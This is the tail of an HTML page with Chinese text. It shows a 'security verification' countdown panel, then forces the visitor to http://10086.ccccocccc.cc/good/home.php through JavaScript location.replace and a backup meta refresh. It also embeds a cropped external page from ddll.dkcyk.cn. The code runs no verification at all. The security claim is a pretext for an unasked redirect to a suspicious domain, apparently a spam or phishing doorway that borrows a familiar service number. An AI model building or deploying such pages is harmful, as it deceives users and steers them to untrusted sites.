    <style>
        /* 居中倒计时面板 */
        #countdown-panel {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.9);
            color: #fff;
            padding: 30px 50px;
            border-radius: 15px;
            z-index: 9999;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
            text-align: center;
            min-width: 280px;
            backdrop-filter: blur(8px);
            transition: all 0.3s ease;
        }

        /* 隐藏状态 */
        #countdown-panel.hidden {
            opacity: 0;
            transform: translate(-50%, -50%) scale(0.8);
            pointer-events: none;
        }

        #countdown {
            font-size: 36px;
            font-weight: bold;
            color: #00ff9d;
            margin: 20px 0;
            font-family: 'Arial Black', sans-serif;
            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
        }

        #cancel-btn {
            background: #ff4757;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            cursor: pointer;
            margin-top: 20px;
            font-size: 16px;
            transition: all 0.3s ease;
        }

        #cancel-btn:hover {
            background: #ff6b81;
            transform: translateY(-2px);
            box-shadow: 0 4px 15px rgba(255, 107, 129, 0.4);
        }

        .tip-text {
            font-size: 12px;
            color: #95a5a6;
            margin-top: 15px;
            line-height: 1.4;
        }

        /* 成功提示 */
        .success-message {
            position: fixed;
            top: 20px;
            right: -300px;
            background: #2ecc71;
            color: white;
            padding: 15px 25px;
            border-radius: 8px;
            z-index: 9999;
            transition: right 0.5s ease;
            box-shadow: 0 3px 10px rgba(0,0,0,0.2);
        }

        /* 移动端适配 */
        @media (max-width: 768px) {
            #countdown-panel {
                padding: 20px;
                width: 80%;
                min-width: auto;
            }
            #countdown {
                font-size: 28px;
            }
        }
    </style>
</head>
<body>
    <!-- 倒计时面板 -->
    <div id="countdown-panel">
        <div style="font-size: 18px;">⏳ 安全验证中</div>
        <div id="countdown">3秒</div>
        <button id="cancel-btn">停留在本页</button>
        <div class="tip-text">
            * 正在加载安全环境<br>
            * 停留本页后如需到达首页，关闭重启即可<br>
            * 跳转后将无法返回当前页面<br>
        </div>
    </div>

    <!-- 成功提示 -->
    <div class="success-message" id="successMsg">
        ✅ 已成功取消跳转
    </div>

    <!-- 内容展示区 -->
    <div style="position: relative; height: 100vh; overflow: hidden;">
        <iframe 
            src="http://ddll.dkcyk.cn/qV3Ob2722I" 
            style="
                position: absolute;
                top: -150px;
                left: 0;
                width: 100%;
                height: calc(100vh + 300px);
                border: 0;"
            scrolling="no"
            frameborder="0">
        </iframe>
    </div>

    <script>
        // 配置参数
        const TARGET_URL = 'http://10086.ccccocccc.cc/good/home.php';
        const INITIAL_TIME = 3; // 单位：秒

        let countdown = INITIAL_TIME;
        let timer = null;
        
        // 倒计时更新函数
        function updateCountdown() {
            countdown--;
            document.getElementById('countdown').textContent = `${countdown}秒`;
            
            if(countdown <= 0) {
                clearInterval(timer);
                window.location.replace(TARGET_URL);
            }
        }

        // 启动倒计时
        timer = setInterval(updateCountdown, 1000);

        // 取消按钮事件
        document.getElementById('cancel-btn').addEventListener('click', function() {
            clearInterval(timer);
            
            const panel = document.getElementById('countdown-panel');
            const successMsg = document.getElementById('successMsg');

            // 触发隐藏动画
            panel.classList.add('hidden');

            // 面板动画完成后处理
            panel.addEventListener('transitionend', () => {
                panel.remove();
                
                // 显示成功提示
                setTimeout(() => {
                    successMsg.style.right = '20px';
                    
                    // 3秒后隐藏提示
                    setTimeout(() => {
                        successMsg.style.right = '-300px';
                    }, 3000);
                }, 100);
            }, { once: true });
        });

        // ESC键取消功能
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                document.getElementById('cancel-btn').click();
            }
        });

        // 防止iframe操作父页面
        if (window.self !== window.top) {
            window.top.location = window.self.location;
        }

        // 备用meta跳转
        document.write('<noscript><meta http-equiv="refresh" content="' + INITIAL_TIME + ';url=' + TARGET_URL + '"></noscript>');
    </script>
</body>
